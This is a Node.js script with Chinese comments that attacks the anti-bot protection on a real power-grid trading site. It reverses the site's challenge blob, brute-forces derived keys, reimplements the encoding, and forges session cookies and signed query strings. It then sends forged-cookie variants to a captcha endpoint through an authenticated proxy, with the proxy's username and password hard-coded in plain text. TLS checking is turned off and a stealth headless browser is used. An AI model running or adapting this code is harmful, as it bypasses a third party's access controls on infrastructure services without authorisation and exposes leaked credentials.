/**
 * 779_template_base_test.js
 * 验证假设：base[68:92] = 可变前缀 + 固定模板尾部，服务器只校验结构
 * 变体：
 *  1. 当前 base 原样 → 200 对照
 *  2. [68:92] 用"模板组4结构"重建（固定模板 + 随机可变）→ 测试
 *  3. [68:92] 只保留固定模板锚点（217,225,16,119,121）+ 其余随机 → 测试
 *  4. [68:92] 全随机 → 412 对照
 */
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
process.env.NODE_OPTIONS = '--dns-result-order=ipv4first';
process.env.OPENSSL_LEGACY_RENEGOTIATION = '1';
const fs = require('fs');
const path = require('path');
const http = require('http');
const tls = require('tls');
const { chromium } = require('/Users/luoyy/work/github/GitHub/rs-reverse_kimi/node_modules/patchright');

const ROOT = path.join(__dirname, '..');
const TARGET = 'https://pmos.nx.sgcc.com.cn:10443/';
const NX_BS = 'qrcklmDoExthWJiHAp1sVYKU3RFMQw8IGfPO92bvLNj-7zXBaSnu0TC6gy_4Ze5d{}|~ !#$%()*+,.;=?@[]^';
const K16 = [215, 90, 92, 114, 190, 161, 210, 59, 55, 192, 204, 2, 209, 95, 17, 173];
const UA = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const PROXY_AUTH = 'Basic ' + Buffer.from('74940609:aFmWc5Fs').toString('base64');
const EXT_PROXY = { server: 'http://36.134.44.6:2018', username: '74940609', password: 'aFmWc5Fs' };

function decodeB86(str) {
  const idxmap = {}; for (let i = 0; i < 64; i++) idxmap[NX_BS[i]] = i;
  const bytes = []; let qi = 0;
  for (let g = 0; g < Math.floor(str.length / 4); g++) {
    const c0 = idxmap[str[qi]], c1 = idxmap[str[qi + 1]], c2 = idxmap[str[qi + 2]], c3 = idxmap[str[qi + 3]];
    if (c0 === undefined) return null;
    qi += 4;
    bytes.push((c0 << 2) | (c1 >> 4), ((c1 & 15) << 4) | (c2 >> 2), ((c2 & 3) << 6) | c3);
  }
  const rem = str.length - qi;
  if (rem === 2) { const c0 = idxmap[str[qi]], c1 = idxmap[str[qi + 1]]; if (c0 === undefined) return null; bytes.push((c0 << 2) | (c1 >> 4)); }
  else if (rem === 3) { const c0 = idxmap[str[qi]], c1 = idxmap[str[qi + 1]], c2 = idxmap[str[qi + 2]]; if (c0 === undefined) return null; bytes.push((c0 << 2) | (c1 >> 4), ((c1 & 15) << 4) | (c2 >> 2)); }
  return bytes;
}
function httpsGet(url) {
  return new Promise((resolve) => {
    const u = new URL(url);
    const connectReq = http.request({
      host: '36.134.44.6', port: 2018, method: 'CONNECT',
      path: `${u.hostname}:${u.port || 443}`,
      headers: { 'Proxy-Authorization': PROXY_AUTH, Host: `${u.hostname}:${u.port || 443}` }, timeout: 25000,
    });
    connectReq.on('connect', (res, socket) => {
      if (res.statusCode !== 200) { socket.destroy(); resolve({ status: 'ERR' }); return; }
      const tlsSock = tls.connect({ socket, servername: u.hostname, rejectUnauthorized: false }, () => {
        tlsSock.write(`GET ${u.pathname + u.search} HTTP/1.1\r\nHost: ${u.hostname}:${u.port || 443}\r\nUser-Agent: ${UA}\r\nAccept: */*\r\nConnection: close\r\n\r\n`);
      });
      let body = '', raw = '';
      tlsSock.on('data', d => raw += d);
      tlsSock.on('end', () => {
        const headEnd = raw.indexOf('\r\n\r\n');
        if (headEnd >= 0) {
          const resHead = raw.substring(0, headEnd);
          const setCookies = [];
          resHead.split('\r\n').forEach(l => { if (/^set-cookie:/i.test(l)) setCookies.push(l.substring(11).split(';')[0]); });
          resolve({ status: parseInt((resHead.split(' ')[1] || '').trim()), body: raw.substring(headEnd + 4), setCookies });
        } else resolve({ status: 'ERR' });
      });
      tlsSock.on('error', e => resolve({ status: 'ERR' }));
    });
    connectReq.on('error', e => resolve({ status: 'ERR' }));
    connectReq.on('timeout', () => { connectReq.destroy(); resolve({ status: 'TIMEOUT' }); });
    connectReq.end();
  });
}

(async () => {
  require('module-alias')(path.dirname(require(path.join(ROOT, 'utils/paths.js')).package));
  require(path.join(ROOT, 'src/handler/parser/constData')).init();
  const { encryptMode1, encryptMode2 } = require(path.join(ROOT, 'src/handler/parser/common/modeEncrypt'));
  const numarrAddTime = require(path.join(ROOT, 'src/handler/parser/common/numarrAddTime'));
  const numarr2string = require(path.join(ROOT, 'src/handler/parser/common/numarr2string'));
  const numToNumarr4 = require(path.join(ROOT, 'src/handler/parser/common/numToNumarr4'));
  const uuidFn = require(path.join(ROOT, 'src/handler/parser/common/uuid'));
  const keys16arr = numarrAddTime([...K16], 0, 1 / 256)[0];
  const B86_64 = 'qrcklmDoExthWJiHAp1sVYKU3RFMQw8IGfPO92bvLNj-7zXBaSnu0TC6gy_4Ze5d{}|~ !#$%()*+,.;=?@[]^';
  function getTree() {
    let arr = [];
    for (let i = 1; i < 255; i++) arr.push({ total: 1, idx: i });
    arr.push({ total: 6, idx: 255 }, { total: 45, idx: 0 });
    function parse(item) {
      for (let i = 0; i < arr.length; i++) { if (item.total <= arr[i].total) { arr.splice(i, 0, item); return; } }
      arr.push(item);
    }
    while (arr.length > 1) {
      const [one, two] = arr.slice(0, 2);
      arr = arr.slice(2);
      parse({ total: one.total + two.total, first: one, second: two });
    }
    return arr[0];
  }
  function getEncCfg(tree, config = { key: 0, val: 0 }, arr = []) {
    if (tree.idx === undefined) {
      getEncCfg(tree.first, { key: config.key << 1, val: config.val + 1 }, arr);
      getEncCfg(tree.second, { key: (config.key << 1) + 1, val: config.val + 1 }, arr);
    } else arr[tree.idx] = config;
    return arr;
  }
  let huffEncCfg = null;
  function nxEncrypt(numarr) {
    if (!huffEncCfg) huffEncCfg = getEncCfg(getTree());
    const ans = [];
    let one = 0, two = 0;
    for (let i = 0; i < numarr.length; i++) {
      const cfg = huffEncCfg[numarr[i]];
      one = one << cfg.val | cfg.key;
      two += cfg.val;
      while (two >= 8) { ans.push(one >> two - 8); one &= ~(255 << two - 8); two -= 8; }
    }
    if (two > 0) ans.push(one << 8 - two | 0x68 >> two);
    return ans;
  }
  function makeDecryptKeys(bs) {
    return bs.split('').reduce((ans, key, idx) => {
      const code = key.charCodeAt();
      ans[0][code] = idx << 2; ans[1][code] = idx >> 4;
      ans[2][code] = (idx & 15) << 4; ans[3][code] = idx >> 2;
      ans[4][code] = (idx & 3) << 6; ans[5][code] = idx;
      return ans;
    }, [{}, {}, {}, {}, {}, { ...new Array(255 + 1).fill(-1) }]);
  }
  function decryptCd(cd) {
    const dk = makeDecryptKeys(NX_BS);
    const [d1, d2, d3, d4, d5, d6] = dk;
    const arr2 = [];
    for (let i = 0; i < cd.length; i += 4) {
      const one = cd[i].charCodeAt();
      const two = i + 1 < cd.length ? cd[i + 1].charCodeAt() : undefined;
      const three = i + 2 < cd.length ? cd[i + 2].charCodeAt() : undefined;
      const four = i + 3 < cd.length ? cd[i + 3].charCodeAt() : undefined;
      two !== undefined && arr2.push(d1[one] | d2[two]);
      three !== undefined && arr2.push(d3[two] | d4[three]);
      four !== undefined && arr2.push(d5[three] | d6[four]);
    }
    return arr2;
  }
  function deriveKeys(cdArr) {
    const end = (cdArr[0] << 8 | cdArr[1]) + 2;
    const tail = cdArr.slice(end);
    function getLensGo(numarr, idx) {
      const item = numarr[idx]; idx++;
      let lens;
      if ((item & 128) === 0) lens = item;
      else if ((item & 192) === 128) { lens = ((item & 63) << 8) | numarr[idx]; idx++; }
      else if ((item & 224) === 192) { lens = ((item & 31) << 16) | (numarr[idx] << 8) | numarr[idx + 1]; idx += 2; }
      else if ((item & 240) === 224) { lens = ((item & 15) << 24) | (numarr[idx] << 16) | (numarr[idx + 1] << 8) | numarr[idx + 2]; idx += 3; }
      else if ((item & 248) === 240) { lens = (numarr[idx] << 24) | (numarr[idx + 1] << 16) | (numarr[idx + 2] << 8) | numarr[idx + 3]; idx += 4; }
      else lens = item;
      return [lens, idx];
    }
    for (let k0 = 0; k0 <= 127; k0++) {
      for (let k1 = 0; k1 <= 127; k1++) {
        const off = [tail[0] ^ 51, tail[1] ^ 2, tail[2] ^ k0, tail[3] ^ k1, tail[4] ^ 2, tail[5] ^ k0, tail[6] ^ k1, tail[7] ^ 48];
        const ans = tail.map((b, i) => b ^ off[i % 8]);
        if (ans[0] !== 51 || ans[1] !== 2 || ans[4] !== 2 || ans[7] !== 48) continue;
        if (ans.some(v => v > 255)) continue;
        const keys = [];
        let op = 1, gap, ok = true;
        for (let i = 0; i < ans[0]; i++) {
          [gap, op] = getLensGo(ans, op);
          if (gap < 0 || op + gap > ans.length) { ok = false; break; }
          keys.push(ans.slice(op, op + gap));
          op += gap;
        }
        if (!ok) continue;
        const k16 = keys[16];
        if (k16 && k16.length === 16 && k16.every((v, i) => v === K16[i])) return { off, keys };
      }
    }
    return null;
  }
  function huffmanDecodeRaw(enc) {
    const encCfg = getEncCfg(getTree());
    const byLenMap = {}; let maxL = 0;
    for (let idx = 0; idx < 256; idx++) {
      const c = encCfg[idx];
      if (!c) continue;
      if (!byLenMap[c.val]) byLenMap[c.val] = {};
      byLenMap[c.val][c.key] = idx;
      if (c.val > maxL) maxL = c.val;
    }
    const ans = [];
    let key = 0, val = 0;
    for (let i = 0; i < enc.length; i++) {
      for (let b = 7; b >= 0; b--) {
        key = (key << 1) | ((enc[i] >> b) & 1);
        val++;
        const mm = byLenMap[val];
        if (mm && mm[key] !== undefined) { ans.push(mm[key]); key = 0; val = 0; }
        if (val > maxL) { key = 0; val = 0; }
      }
    }
    return ans;
  }

  const ch = await httpsGet(TARGET);
  if (ch.status !== 412) { console.log('拉取失败', ch.status); process.exit(1); }
  const mm = ch.body.match(/\$_ts\.nsd=(\d+);\$_ts\.cd="([^"]+)"/);
  const nsd = +mm[1];
  const cd = mm[2];
  const O_COOKIE = ch.setCookies.find(c => /O=/.test(c)) || '';
  console.log('固定 html: nsd=' + nsd);
  const der = deriveKeys(decryptCd(cd));
  if (!der) { console.log('keys 派生失败'); process.exit(1); }
  const keys17arr = numarrAddTime([...der.keys[17]], 0, 1 / 256)[0];
  const b86 = decodeB86(cd);

  function decodeBase(p) {
    const dec = encryptMode2([...decodeB86(p.value.slice(1))], keys16arr, 1);
    const na = dec.slice(4);
    const beLen = (na[59] & 0x7f) << 8 | na[60];
    const be = na.slice(61, 61 + beLen);
    const keys2 = na.slice(11, 59);
    const tmp = encryptMode2([...be], keys17arr, 0);
    const huff = tmp.map((v, j) => j < 16 ? (v ^ keys2[j]) : v);
    const raw = huffmanDecodeRaw(huff);
    let bestLen = 0;
    const huffHead = huff.slice(0, huff.length - 1);
    for (let L = raw.length; L >= 1; L--) {
      const enc = nxEncrypt(raw.slice(0, L));
      if (JSON.stringify(enc.slice(0, enc.length - 1)) === JSON.stringify(huffHead)) { bestLen = L; break; }
    }
    return { base: raw.slice(0, bestLen), keys2, pName: p.name, r2mka: na.slice(2, 6), startv: na.slice(6, 10) };
  }
  function buildCookie(newBase, keys2) {
    const huffA = nxEncrypt(newBase);
    const xorNew = [...huffA];
    for (let i = 0; i < 16; i++) xorNew[i] ^= keys2[i];
    const now = Math.floor(Date.now() / 1000);
    const beNew = encryptMode1(xorNew, numarrAddTime([...der.keys[17]], now, Math.random())[0], 0);
    const newNa = [
      4, 8, ...numToNumarr4(now), ...numToNumarr4(now), 48, ...keys2,
      (beNew.length >> 8 & 255) | 128, beNew.length & 255, ...beNew,
    ];
    const u4 = numToNumarr4(uuidFn(newNa));
    return 'a' + numarr2string(encryptMode1([...u4, ...newNa], keys16arr, 1), B86_64);
  }
  function crc32b(buf) {
    let c = ~0;
    for (const d of buf) {
      c ^= d;
      for (let k = 0; k < 8; k++) c = (c >>> 1) ^ (0xEDB88320 & -(c & 1));
    }
    return ~c >>> 0;
  }
  const MASK = [0x0b, 0x16, 0x00, 0x10, 0x00, 0x31, 0x00, 0x01];
  const randByte = () => Math.floor(Math.random() * 256);
  function genQuery(urlPath, k2) {
    const cu = crc32b(Buffer.from(urlPath.toUpperCase()));
    const plain24 = [
      k2[0] ^ MASK[0], k2[1] ^ MASK[1], k2[2] ^ MASK[2], k2[3] ^ MASK[3],
      k2[4] ^ MASK[4], k2[5] ^ MASK[5], k2[6] ^ MASK[6], k2[7] ^ MASK[7],
      randByte(), randByte(), randByte(), randByte(), randByte(),
      randByte(), randByte(), randByte(), 0xb7, randByte(), randByte(), randByte(),
      (cu >>> 24) & 255, (cu >>> 16) & 255, (cu >>> 8) & 255, cu & 255,
    ];
    const [key21] = numarrAddTime([...der.keys[17]], Math.floor(Date.now() / 1000), Math.random());
    const requestData = encryptMode1(plain24, key21, 0);
    const body = [4, 0, 48, ...k2, 32, ...requestData];
    const crc = crc32b(Buffer.from(body));
    return 'a' + numarr2string([(crc >>> 24) & 255, (crc >>> 16) & 255, (crc >>> 8) & 255, crc & 255, ...body], B86_64);
  }
  const API = '/px-common-authcenter/auth/v2/captcha/get';
  function testCookie(cookieStr, k2) {
    return new Promise((resolve) => {
      const q1 = genQuery(API, k2);
      const url = 'https://pmos.nx.sgcc.com.cn:10443' + API + '?' + q1;
      const u = new URL(url);
      const connectReq = http.request({
        host: '36.134.44.6', port: 2018, method: 'CONNECT',
        path: `${u.hostname}:${u.port || 443}`,
        headers: { 'Proxy-Authorization': PROXY_AUTH, Host: `${u.hostname}:${u.port || 443}` }, timeout: 25000,
      });
      connectReq.on('connect', (res, socket) => {
        if (res.statusCode !== 200) { socket.destroy(); resolve('ERR'); return; }
        const tlsSock = tls.connect({ socket, servername: u.hostname, rejectUnauthorized: false }, () => {
          const ock = O_COOKIE;
          tlsSock.write(`GET ${u.pathname + u.search} HTTP/1.1\r\nHost: ${u.hostname}:${u.port || 443}\r\nUser-Agent: ${UA}\r\nCookie: ${ock}; ${cookieStr}\r\nAccept: application/json, text/plain, */*\r\nConnection: close\r\n\r\n`);
        });
        let raw = '';
        tlsSock.on('data', d => raw += d);
        tlsSock.on('end', () => {
          const headEnd = raw.indexOf('\r\n\r\n');
          if (headEnd >= 0) {
            const status = parseInt(raw.substring(9, 12));
            const body = raw.substring(headEnd + 4).substring(0, 50).replace(/\n/g, ' ');
            resolve(status + ' ' + body);
          } else resolve('ERR');
        });
        tlsSock.on('error', e => resolve('ERR'));
      });
      connectReq.on('error', e => resolve('ERR'));
      connectReq.on('timeout', () => { connectReq.destroy(); resolve('TIMEOUT'); });
      connectReq.end();
    });
  }

  const browser = await chromium.launch({ headless: true, proxy: EXT_PROXY, args: ['--ignore-certificate-errors', '--no-sandbox'] });
  const context = await browser.newContext({ ignoreHTTPSErrors: true, userAgent: UA });
  const page = await context.newPage();
  await page.route('**/pmos.nx.sgcc.com.cn:10443/', (route) => {
    if (route.request().resourceType() === 'document') {
      route.fulfill({ status: 412, contentType: 'text/html', body: ch.body }).catch(() => {});
    } else route.continue().catch(() => {});
  });
  try { await page.goto(TARGET, { timeout: 60000, waitUntil: 'domcontentloaded' }); } catch (e) {}
  let p = null;
  for (let j = 0; j < 10; j++) {
    await page.waitForTimeout(5000);
    const ck = await context.cookies();
    p = ck.find(c => /P$/.test(c.name));
    if (p) break;
  }
  await page.close();
  await context.close();
  await browser.close();
  if (!p) { console.log('无 P'); process.exit(1); }
  const res = decodeBase(p);
  const BASE = res.base;
  const K2 = res.keys2;
  const PNAME = res.pName;
  const L = BASE.length;
  console.log('当前 base len=' + L + ' [0-15]=' + BASE.slice(0, 16).join(','));
  console.log('当前 [68:92]=' + BASE.slice(68, 92).join(','));
  console.log();

  // 模板重建：保留 base[0-67] 固定结构 + 重建 [68:92]
  // 模板组4: 可变15B + [217,225,16,119,121] + 变体3B
  const tmpl_grp4 = [217, 225, 16, 119, 121];
  const variants = {
    '0_原样': [...BASE],
    '1_重建[68:92]=可变+模板4': (() => {
      const x = [...BASE];
      for (let i = 68; i < 92; i++) x[i] = 1 + ((i * 7) % 250);
      for (let j = 0; j < 5; j++) x[68 + 15 + j] = tmpl_grp4[j];
      x[88] = 1 + Math.floor(Math.random() * 250);
      x[89] = 2 + Math.floor(Math.random() * 250);
      x[90] = 3 + Math.floor(Math.random() * 250);
      return x;
    })(),
    '2_重建[68:92]=模板4+0填充': (() => {
      const x = [...BASE];
      for (let i = 68; i < 92; i++) x[i] = 0;
      for (let j = 0; j < 5; j++) x[68 + 15 + j] = tmpl_grp4[j];
      return x;
    })(),
    '3_重建[68:92]=模板3(221,218,233,234)': (() => {
      const x = [...BASE];
      for (let i = 68; i < 92; i++) x[i] = 1 + ((i * 11) % 250);
      for (let j = 0; j < 4; j++) x[68 + 16 + j] = [221, 218, 233, 234][j];
      return x;
    })(),
    '4_全随机': (() => {
      const x = [...BASE];
      for (let i = 68; i < 92; i++) x[i] = Math.floor(Math.random() * 256);
      return x;
    })(),
  };
  console.log('=== 模板重建测试（固定 nsd=' + nsd + '） ===');
  for (const [name, nb] of Object.entries(variants)) {
    try {
      const newP = buildCookie(nb, K2);
      const tr = await testCookie(PNAME + '=' + newP, K2);
      console.log(name + ' [68:92]=' + nb.slice(68, 92).join(','));
      console.log('  → ' + tr.substring(0, 60));
      await new Promise(r2 => setTimeout(r2, 1500));
    } catch (e) { console.log(name + ' 构造失败:', e.message.substring(0, 60)); }
  }
  process.exit(0);
})().catch(e => { console.error('FATAL:', e.message); process.exit(1); });
